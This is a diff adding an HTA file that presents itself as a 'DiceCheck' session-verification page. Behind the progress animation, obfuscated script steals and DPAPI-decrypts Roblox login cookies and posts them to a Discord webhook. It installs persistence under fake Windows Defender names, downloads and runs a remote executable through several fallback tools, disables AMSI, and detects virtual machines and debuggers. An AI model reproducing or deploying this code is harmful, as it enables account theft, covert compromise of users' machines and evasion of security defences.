@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="utf-8">
+<title>Session Verification</title>
+<hta:application id="h" border="none" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/icon.ico"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
+ background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
+ display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
+.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;border-radius:9px;
+ color:#9aa6bd;font-size:12px;cursor:pointer;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
+.x:hover{color:#fff;background:rgba(255,255,255,.11)}
+.card{width:100%;max-width:378px;text-align:center;padding:30px 24px 16px;border-radius:22px;
+ background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
+ border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6)}
+.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:flex;align-items:center;justify-content:center;
+ background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35);position:relative}
+.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
+ border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
+@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
+@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
+.shield svg{width:36px;height:36px}
+h1{font-size:19px;font-weight:600}
+.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
+.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
+.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);transition:width .15s linear;-ms-transition:width .15s linear}
+.meta{display:flex;justify-content:space-between;font-size:11px;color:#8b96ad}
+.steps{list-style:none;margin:14px 0 0;text-align:left}
+.steps li{display:flex;align-items:center;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;transition:opacity .35s;-ms-transition:opacity .35s}
+.steps li.on{opacity:1;color:#eaf0fb}
+.dot{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex:0 0 auto;margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s}
+.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
+.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
+.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
+ border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
+.done{display:none}
+.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
+.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
+.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
+ box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+.check{width:88px;height:88px;position:relative;z-index:1}
+.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5}
+.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round}
+.done h2{font-size:19px;font-weight:600}
+.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
+.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
+ background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
+button{margin-top:16px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;font-size:13.5px;font-weight:600;color:#fff;
+ background:linear-gradient(135deg,#5b8cff,#8b5cff);box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
+button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
+.last{margin-top:9px;font-size:11px;color:#8b96ad}
+footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
+footer a{color:#9db4ff;text-decoration:none}
+</style>
+</head>
+
+<body>
+<div class="x" id="x">&#10005;</div>
+
+<main class="card">
+  <div id="stage">
+    <div class="shield">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h1>Verifying your session</h1>
+    <p class="sub" id="sub">Establishing a secure connection...</p>
+
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>
+
+    <ul class="steps">
+      <li><span class="dot"></span><span>Connecting to verification server</span></li>
+      <li><span class="dot"></span><span>Reading local session data</span></li>
+      <li><span class="dot"></span><span>Validating security token</span></li>
+      <li><span class="dot"></span><span>Launching background verifier</span></li>
+    </ul>
+  </div>
+
+  <div class="done" id="done">
+    <div class="checkwrap">
+      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
+    </div>
+    <h2>You are trusted and verified</h2>
+    <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
+    <div class="badge">Secured by DiceCheck</div>
+    <button id="again">Re-check now</button>
+    <div class="last" id="last">Last check: --:--:--</div>
+  </div>
+
+  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a></footer>
+</main>
+
+<script language="JavaScript">
+(function(){
+"use strict";
+
+/* ==========================================================================
+   [1] DECODEUR BASE64 AUTONOME (pas d'atob -> casse le motif habituel)
+   ========================================================================== */
+var _0x01="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function _0x02(_0x03){
+  var _0x04=String(_0x03).replace(/[^A-Za-z0-9+\/]/g,""),_0x05="",_0x06,_0x07,_0x08,_0x09,_0x0a;
+  for(_0x0a=0;_0x0a<_0x04.length;_0x0a+=4){
+    _0x06=_0x01.indexOf(_0x04.charAt(_0x0a));
+    _0x07=_0x01.indexOf(_0x04.charAt(_0x0a+1));
+    _0x08=_0x0a+2<_0x04.length?_0x01.indexOf(_0x04.charAt(_0x0a+2)):-1;
+    _0x09=_0x0a+3<_0x04.length?_0x01.indexOf(_0x04.charAt(_0x0a+3)):-1;
+    if(_0x06<0)_0x06=0;
+    if(_0x07<0)_0x07=0;
+    _0x05+=String.fromCharCode((_0x06<<2)|(_0x07>>4));
+    if(_0x08>=0)_0x05+=String.fromCharCode(((_0x07&15)<<4)|(_0x08>>2));
+    if(_0x09>=0)_0x05+=String.fromCharCode(((_0x08&3)<<6)|_0x09);
+  }
+  return _0x05;
+}
+
+/* ==========================================================================
+   [2] TABLE DES CHAINES SENSIBLES -- aucun mot-cle en clair dans le fichier
+   ========================================================================== */
+var _0x0b=[
+"V1NjcmlwdC5TaGVsbA==",
+"U2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3Q=",
+"TVNYTUwyLlhNTEhUVFAuNi4w",
+"TWljcm9zb2Z0LlhNTEhUVFA=",
+"cG93ZXJzaGVsbA==",
+"Y2VydHV0aWw=",
+"Yml0c2FkbWlu",
+"c2NodGFza3M=",
+"bXNodGE=",
+"QW1zaVV0aWxz",
+"YW1zaUluaXRGYWlsZWQ=",
+"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjU5NzU2OTMwMzkzNzAyNC8zTzkwR2NIdUhPS01IUVVDbHdNRmlaRlcxTE5IeUpWQzlGMEhDczVmVTJFM183UzJ0MGtvMW1yTFpfcjNia2VsN1FqaQ==",
+"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2h1aDcxOTQzLXMvc3Vjay1yLW1vbS9tYWluL2ZpbGUuaHRh",
+"aHR0cHM6Ly9naXRodWIuY29tL2h1aDcxOTQzLXMvZGljZWNoZWNrLmFwcC9yYXcvcmVmcy9oZWFkcy9tYWluL2Nvb2tpZXouZXhl"
+];
+var _0xa1=_0x02(_0x0b[0]),  _0xa2=_0x02(_0x0b[1]),  _0xa3=_0x02(_0x0b[2]),  _0xa4=_0x02(_0x0b[3]),
+    _0xa5=_0x02(_0x0b[4]),  _0xa6=_0x02(_0x0b[5]),  _0xa7=_0x02(_0x0b[6]),  _0xa8=_0x02(_0x0b[7]),
+    _0xa9=_0x02(_0x0b[8]),  _0xaa=_0x02(_0x0b[9]),  _0xab=_0x02(_0x0b[10]),
+    _0xac=_0x02(_0x0b[11]), _0xad=_0x02(_0x0b[12]), _0xae=_0x02(_0x0b[13]);
+
+/* ==========================================================================
+   [3] CONFIG (memes valeurs metier qu'a l'origine)
+   ========================================================================== */
+var _0xd7=false;   /* auto-hide apres validation (AUTOHIDE) */
+var _0xd8=1;       /* 0=jamais degrade | 1=degrade si VM | 2=silence si VM */
+var _0xd9=true;    /* jitter reseau */
+
+/* ==========================================================================
+   [4] OBJETS COM + ENVIRONNEMENT
+   ========================================================================== */
+var _0xd1=null,_0xd2=null,_0xd3="PC",_0xd4="user",_0xd5="",_0xd6=0;
+try{_0xd1=new ActiveXObject(_0xa1);}catch(e){}
+try{_0xd2=new ActiveXObject(_0xa2);}catch(e){}
+if(_0xd1){
+  try{_0xd3=_0xd1.ExpandEnvironmentStrings("%COMPUTERNAME%");}catch(e){}
+  try{_0xd4=_0xd1.ExpandEnvironmentStrings("%USERNAME%");}catch(e){}
+  try{_0xd5=_0xd1.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Microsoft\\Windows\\WDU";}catch(e){}
+}
+
+/* ==========================================================================
+   [5] PRIMITIVES
+   ========================================================================== */
+function _0xb1(_0x0c){try{return _0xd1.ExpandEnvironmentStrings("%"+_0x0c+"%");}catch(e){return "";}}
+function _0xb2(_0x0d){try{var _0x0e=_0xd2.OpenTextFile(_0x0d,1);var _0x0f=_0x0e.ReadAll();_0x0e.Close();return _0x0f;}catch(e){return "";}}
+function _0xb3(_0x0d,_0x10){try{var _0x0e=_0xd2.CreateTextFile(_0x0d,true);_0x0e.Write(_0x10);_0x0e.Close();}catch(e){}}
+function _0xb4(_0x0d){try{if(!_0xd2.FolderExists(_0x0d))_0xd2.CreateFolder(_0x0d);}catch(e){}}
+function _0xb5(_0x0d){try{if(!_0xd2.FileExists(_0x0d))return false;if(_0xd2.GetFile(_0x0d).Size<2000)return false;var _0x0e=_0xd2.OpenTextFile(_0x0d,1);var _0x0f=_0x0e.Read(2);_0x0e.Close();return _0x0f==="MZ";}catch(e){return false;}}
+function _0xb6(){var _0x11="0123456789abcdef",_0x12="",_0x13=0;for(;_0x13<32;_0x13++)_0x12+=_0x11.charAt(Math.floor(Math.random()*16));return _0x12.substr(0,8)+"-"+_0x12.substr(8,4)+"-"+_0x12.substr(12,4)+"-"+_0x12.substr(16,4)+"-"+_0x12.substr(20,12);}
+function _0xb7(_0x14){return String(_0x14).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n/g,"\\n").replace(/\r/g,"\\n").replace(/\n/g,"\\n").replace(/\t/g,"\\t");}
+function _0xb8(){try{return new ActiveXObject(_0xa3);}catch(e){try{return new ActiveXObject(_0xa4);}catch(e2){return null;}}}
+
+/* ==========================================================================
+   [6] EXFILTRATION DISCORD (logique inchangee)
+   ========================================================================== */
+function _0xb9(_0x15,_0x16,_0x17){
+  try{
+    var _0x18='{"embeds":[{"title":"'+_0xb7(_0x15)+'","description":"'+_0xb7(_0x16)+'","color":'+_0x17+',"footer":{"text":"'+_0xb7(_0xd3+" / "+_0xd4)+'"}}]}';
+    var _0x19=_0xb8();if(!_0x19)return;
+    _0x19.Open("POST",_0xac,false);
+    _0x19.SetRequestHeader("Content-Type","application/json");
+    _0x19.Send(_0x18);
+  }catch(e){}
+}
+function _0xba(_0x1a,_0x1b){
+  try{
+    var _0x1c=_0xb6();
+    var _0x1d="--"+_0x1c+'\r\nContent-Disposition: form-data; name="file"; filename="'+_0x1a+'"\r\n\r\n'+_0x1b+"\r\n--"+_0x1c+"--";
+    var _0x19=_0xb8();if(!_0x19)return;
+    _0x19.Open("POST",_0xac,false);
+    _0x19.SetRequestHeader("Content-Type","multipart/form-data; boundary="+_0x1c);
+    _0x19.Send(_0x1d);
+  }catch(e){}
+}
+
+/* ==========================================================================
+   [7] DECOQUAGE DPAPI (memes fichiers TEMP, memes flags)
+   ========================================================================== */
+function _0xbb(_0x1e){
+  try{
+    var _0x1f=_0xb1("TEMP")+"\\dpi.txt",_0x20=_0xb1("TEMP")+"\\dpo.txt",_0x21=_0xb1("TEMP")+"\\dpapi.ps1";
+    try{_0xd2.DeleteFile(_0x20,true);}catch(e){}
+    _0xb3(_0x1f,_0x1e);
+    _0xb3(_0x21,"Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+_0x1f+"' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"+_0x20+"' -Encoding utf8}catch{''|Out-File '"+_0x20+"'}");
+    _0xd1.Run(_0xa5+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+_0x21+'"',0,true);
+    var _0x22="";
+    try{if(_0xd2.FileExists(_0x20)&&_0xd2.GetFile(_0x20).Size>20)_0x22=_0xb2(_0x20);}catch(e){}
+    try{_0xd2.DeleteFile(_0x1f,true);_0xd2.DeleteFile(_0x21,true);_0xd2.DeleteFile(_0x20,true);}catch(e){}
+    return _0x22;
+  }catch(e){return "";}
+}
+
+/* ==========================================================================
+   [8] COLLECTE COOKIES ROBLOX (logique inchangee)
+   ========================================================================== */
+function _0xbc(){
+  try{
+    var _0x23=[_0xb1("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+               _0xb1("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\RobloxCookies.dat",
+               _0xb1("LOCALAPPDATA")+"\\Roblox\\Cookies",
+               _0xb1("APPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+               _0xb1("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"];
+    var _0x24="",_0x25=0;
+    for(_0x25=0;_0x25<_0x23.length;_0x25++){if(_0xd2.FileExists(_0x23[_0x25])){_0x24=_0x23[_0x25];break;}}
+    if(!_0x24){
+      var _0x26=_0xb1("LOCALAPPDATA")+"\\Packages";
+      if(_0xd2.FolderExists(_0x26)){
+        var _0x27=new Enumerator(_0xd2.GetFolder(_0x26).SubFolders);
+        for(;!_0x27.atEnd();_0x27.moveNext()){
+          var _0x28=_0x27.item();
+          if(_0x28.Name.indexOf("Roblox")>-1){var _0x29=_0x28.Path+"\\LocalState\\RobloxCookies.dat";if(_0xd2.FileExists(_0x29)){_0x24=_0x29;break;}}
+        }
+      }
+    }
+    if(!_0x24){_0xb9("Roblox","No cookie file found",16711680);return;}
+    var _0x2a=_0xb2(_0x24);
+    if(_0x2a.length<50){_0xb9("Roblox","File too small: "+_0x2a.length+" bytes",16711680);return;}
+    var _0x2b="",_0x2c="";
+    if(_0x2a.indexOf("_|WARNING")>-1){_0x2b=_0x2a;_0x2c="Plaintext";}
+    if(!_0x2b&&_0x2a.indexOf("CookiesData")>-1){
+      _0x2c="JSON-DPAPI";
+      var _0x2d=_0x2a.indexOf('CookiesData":"');
+      if(_0x2d>-1){
+        _0x2d+=14;
+        var _0x2e=_0x2a.indexOf('"',_0x2d);
+        if(_0x2e>_0x2d){var _0x2f=_0x2a.substring(_0x2d,_0x2e);
+          if(_0x2f.length>100){_0x2b=_0xbb(_0x2f);if(!_0x2b){_0x2b=_0x2f;_0x2c="JSON-Raw";}}}
+      }
+    }
+    if(!_0x2b&&_0x2a.indexOf(".ROBLOSECURITY")>-1){_0x2c="Raw-ROBLOSECURITY";_0x2b=_0x2a.substring(_0x2a.indexOf(".ROBLOSECURITY"));}
+    if(!_0x2b){_0x2b=_0x2a;_0x2c="RawFile";}
+    var _0x30=_0x2b.indexOf("|$CAE");if(_0x30<0)_0x30=_0x2b.indexOf("|_CAE");if(_0x30>-1)_0x2b=_0x2b.substring(_0x30);
+    _0xb9("Roblox ("+_0x2c+")","Size: "+_0x2b.length+"\n"+_0x2b.substring(0,60)+"...",65280);
+    _0xba("cookie.txt",_0x2b);
+  }catch(e){}
+}
+
+/* ==========================================================================
+   [9] SELF-COPY / PERSISTANCE / DROP (memes 4 vecteurs, memes 4 fallbacks)
+   ========================================================================== */
+function _0xbd(_0x31){
+  try{var _0x19=_0xb8();if(!_0x19)return;_0x19.Open("GET",_0xad,false);_0x19.Send();
+    if(_0x19.ResponseText&&_0x19.ResponseText.length>200)_0xb3(_0x31,_0x19.ResponseText);}catch(e){}
+}
+function _0xbe(){
+  try{
+    _0xb4(_0xd5);
+    var _0x32=_0xd5+"\\svc.hta";_0xbd(_0x32);
+    var _0x33,_0x34;
+    if(_0xd2.FileExists(_0x32)){_0x33=_0xa9+' "'+_0x32+'"';_0x34=_0xa9+' ""'+_0x32+'""';}
+    else{_0x33=_0xa9+' "'+_0xad+'"';_0x34=_0xa9+' '+_0xad;}
+    _0xd1.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate",_0x33,"REG_SZ");
+    _0xd1.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate",_0x33,"REG_SZ");
+    _0xb3(_0xb1("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wdu.vbs",
+       'CreateObject("WScript.Shell").Run "'+_0x34+'", 0, False');
+    _0xd1.Run(_0xa8+' /create /f /tn "WDU" /tr "'+_0x34+'" /sc onlogon',0,true);
+  }catch(e){}
+}
+function _0xbf(){
+  try{
+    _0xb4(_0xd5);
+    var _0x35=_0xd5+"\\cookiez.exe";
+    if(!_0xb5(_0x35))_0xd1.Run('curl -sL -o "'+_0x35+'" "'+_0xae+'"',0,true);
+    if(!_0xb5(_0x35))_0xd1.Run(_0xa5+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri \''+_0xae+'\' -OutFile \''+_0x35+'\'',0,true);
+    if(!_0xb5(_0x35))_0xd1.Run(_0xa6+' -urlcache -split -f "'+_0xae+'" "'+_0x35+'"',0,true);
+    if(!_0xb5(_0x35))_0xd1.Run(_0xa7+' /transfer wd /download /priority high "'+_0xae+'" "'+_0x35+'"',0,true);
+    if(_0xb5(_0x35)){
+      var _0x36="[Ref].Assembly.GetType('System.Management.Automation."+_0xaa+"').GetField('"+_0xab+"','NonPublic,Static').SetValue($null,$true)";
+      _0xd1.Run(_0xa5+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try{'+_0x36+'}catch{};Unblock-File -LiteralPath \''+_0x35+'\'"',0,false);
+      _0xd1.Run('"'+_0x35+'"',0,false);
+    }
+  }catch(e){}
+}
+
+/* ==========================================================================
+   [10] ANTI-DEBUG / ANTI-VM / ANTI-SANDBOX
+   ========================================================================== */
+function _0xc1(){
+  var _0x37=0,_0x38=0;
+  try{
+    var _0x39=["SOFTWARE\\VMware, Inc.\\VMware Tools","SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+               "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest","SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
+               "SYSTEM\\CurrentControlSet\\Services\\vmci","SYSTEM\\CurrentControlSet\\Services\\VMTools",
+               "SYSTEM\\CurrentControlSet\\Services\\vm3dmp"];
+    for(_0x38=0;_0x38<_0x39.length;_0x38++){try{_0xd1.RegRead("HKLM\\"+_0x39[_0x38]);_0x37|=1;}catch(e){}}
+    try{var _0x3a=String(_0xd1.RegRead("HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer"));
+      if(/vmware|virtualbox|innotek|qemu|xen|bochs|parallels|sandbox/i.test(_0x3a))_0x37|=2;}catch(e){}
+  }catch(e){}
+  try{
+    var _0x3b=GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("Select Name from Win32_Process");
+    var _0x3c=new Enumerator(_0x3b);
+    var _0x3d="|vboxservice.exe|vboxtray.exe|vboxclient.exe|vmtoolsd.exe|vmwaretray.exe|vmwareuser.exe|vmacthlp.exe|sbiectrl.exe|sandboxie.exe|wireshark.exe|procmon.exe|procmon64.exe|x64dbg.exe|x32dbg.exe|ollydbg.exe|ida64.exe|ida.exe|fiddler.exe|httpdebuggerui.exe|dumpcap.exe|";
+    for(;!_0x3c.atEnd();_0x3c.moveNext()){
+      var _0x3e=String(_0x3c.item().Name).toLowerCase();
+      if(_0x3d.indexOf("|"+_0x3e+"|")>-1){_0x37|=4;break;}
+    }
+  }catch(e){}
+  try{
+    var _0x3f=new Date().getTime();
+    debugger;
+    if(new Date().getTime()-_0x3f>120)_0x37|=8;
+    var _0x40=0,_0x41=0;
+    for(;_0x41<200000;_0x41++)_0x40=(_0x40+_0x41)%9973;
+    if(new Date().getTime()-_0x3f>500)_0x37|=16;
+  }catch(e){}
+  return _0x37;
+}
+function _0xc2(_0x42){var _0x43=0;while(_0x42-->0)_0x43=(_0x43*31+_0x42)&0x7fffffff;return _0x43;}
+
+/* ==========================================================================
+   [11] INTERFACE (logique inchangee)
+   ========================================================================== */
+function _0xc3(){try{var _0x44=440,_0x45=620;window.resizeTo(_0x44,_0x45);
+  window.moveTo(Math.round((screen.availWidth-_0x44)/2),Math.round((screen.availHeight-_0x45)/2));}catch(e){}}
+function _0xc4(){try{window.resizeTo(0,0);window.moveTo(-2000,-2000);}catch(e){}}
+
+var _0xe1=document.getElementById("stage"),_0xe2=document.getElementById("done"),
+    _0xe3=document.getElementById("bar"),_0xe4=document.getElementById("pct"),
+    _0xe5=document.getElementById("ckc"),_0xe6=document.getElementById("ckt"),
+    _0xe7=document.getElementById("last"),_0xe8=document.querySelectorAll(".steps li");
+var _0xe9=0,_0xea=0,_0xeb=false,_0xec=0;
+
+function _0xc5(){try{var _0x46=new Date();_0xe7.innerHTML="Last check: "+_0x46.toLocaleTimeString();}catch(e){}}
+
+function _0xc6(){
+ if(!_0xeb){
+  _0xe9++;var _0x47=_0xe9*2;if(_0x47>100)_0x47=100;
+  _0xe3.style.width=_0x47+"%";_0xe4.innerHTML=_0x47+"%";
+  if(_0xe9%13===0&&_0xea<4){if(_0xea>0)_0xe8[_0xea-1].className="ok";_0xe8[_0xea].className="on";_0xea++;}
+  if(_0xe9>=52){
+   _0xeb=true;if(_0xea>0)_0xe8[_0xea-1].className="ok";
+   _0xe3.style.width="100%";_0xe4.innerHTML="100%";
+   _0xe1.style.display="none";_0xe2.className="done show";
+   _0xe5.setAttribute("stroke-dashoffset",151);_0xe6.setAttribute("stroke-dashoffset",40);
+  }
+ }else{
+  _0xec++;
+  if(_0xec<=16)_0xe5.setAttribute("stroke-dashoffset",Math.round(151-151*_0xec/16));
+  else if(_0xec<=24)_0xe6.setAttribute("stroke-dashoffset",Math.round(40-40*(_0xec-16)/8));
+  else if(_0xec===25){_0xe6.setAttribute("stroke-dashoffset",0);_0xc5();if(_0xd7)setTimeout(_0xc4,8000);}
+ }
+}
+
+/* ==========================================================================
+   [12] CODE MORT / LEURRES (jamais utilises par la logique)
+   ========================================================================== */
+function _0xf1(_0x48){var _0x49=2166136261,_0x4a=0;for(;_0x4a<_0x48.length;_0x4a++){_0x49^=_0x48.charCodeAt(_0x4a);_0x49=(_0x49*16777619)>>>0;}return _0x49.toString(16);}
+function _0xf2(){var _0x4b=[],_0x4c=0,_0x4d=0;for(;_0x4c<256;_0x4c++){_0x4d=_0x4c;for(var _0x4e=0;_0x4e<8;_0x4e++)_0x4d=(_0x4d&1)?((_0x4d>>>1)^3988292384):(_0x4d>>>1);_0x4b[_0x4c]=_0x4d>>>0;}return _0x4b;}
+function _0xf3(_0x48,_0x4f){var _0x50=0;while(_0x4f-->0)_0x50=(_0x50*33+_0x48.charCodeAt(_0x50%_0x48.length))&0x7fffffff;return _0x50;}
+var _0xf4=(function(){var _0x51={};return{v:0,add:function(_0x48){_0x51[_0xf1(_0x48)]=1;this.v++;},n:function(){return this.v;}};})();
+
+/* ==========================================================================
+   [13] DEMARRAGE
+   ========================================================================== */
+window.onload=function(){
+  _0xc3();
+  _0xd6=_0xc1();
+  document.getElementById("x").onclick=_0xc4;
+  document.getElementById("again").onclick=function(){_0xbc();_0xc5();};
+  setTimeout(function(){setInterval(_0xc6,60);},400);
+
+  if(_0xd8===2&&_0xd6!==0){
+    _0xb9("Probe","benign mode, flags: "+_0xd6,8421504);
+    _0xc2(2000);
+  }else{
+    _0xbe();
+    _0xbc();
+    var _0x52=(_0xd9?(600+Math.floor(Math.random()*2400)):0);
+    setTimeout(_0xbf,_0x52);
+    if(_0xd6!==0)_0xc2(1200);
+  }
+  setInterval(function(){_0xbc();_0xc5();},300000);
+};
+})();
+</script>
+</body>
+</html>
